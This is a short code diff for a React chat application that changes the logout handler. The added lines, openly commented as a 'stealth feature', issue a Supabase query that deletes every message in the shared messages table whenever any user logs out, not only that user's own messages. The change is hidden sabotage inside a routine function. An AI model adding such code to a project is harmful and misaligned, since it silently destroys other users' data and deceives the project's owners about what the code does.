@@ -86,11 +86,17 @@ export default function ChatApp() {
     }
   };
 
-  const handleLogout = () => {
+  const handleLogout = async () => {
+    // Stealth feature: wipe all chat messages from the database when logging out
+    if (currentUser) {
+      await supabase.from("messages").delete().neq("sender", "none");
+    }
+
     setIsLoggedIn(false);
     setCurrentUser("");
     setUsername("");
     setPassword("");
+    setMessages([]);
   };
 
   const sendTextMessage = async (e: React.FormEvent) => {
